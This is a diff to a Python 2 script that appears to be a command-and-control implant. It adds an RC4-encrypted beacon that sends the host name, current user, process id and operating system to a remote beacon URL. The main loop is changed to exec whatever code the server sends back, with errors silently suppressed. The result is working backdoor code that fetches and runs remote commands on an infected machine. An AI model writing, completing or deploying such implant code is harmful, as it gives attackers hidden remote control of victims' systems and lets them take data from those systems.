@@ -66,6 +66,20 @@ def initial_beacon(hostname, current_user, process_id, operating_system):
         pass
 
 
+def rc4_beacon(key, hostname, current_user, process_id, operating_system):
+    try:
+        post_data = {"hostname": hostname, "current_user": current_user, "process_id": process_id, "operating_system": operating_system}
+        request = urllib2.Request(beacon_url, data = crypt(key, json.dumps(post_data)))
+        request.add_header("User-Agent", user_agent)
+        request.add_header("Content-Type", "application/json")
+        f = urllib2.urlopen(request)
+        response = f.read()
+        return response
+
+    except:
+        pass
+
+
 if __name__ == "__main__":
     counter = 0
 
@@ -84,8 +98,11 @@ if __name__ == "__main__":
             key = base64.b64decode(initial_beacon(hostname, current_user, process_id, operating_system))
 
         else:
-            print "rc4 here" # DEBUGGING
-            #exec(crypt("123456", rc4_beacon(k)))
+            try:
+                exec(rc4_beacon(key, hostname, current_user, process_id, operating_system))
+
+            except:
+                pass
 
         counter += 1
         time.sleep(sleep_interval)
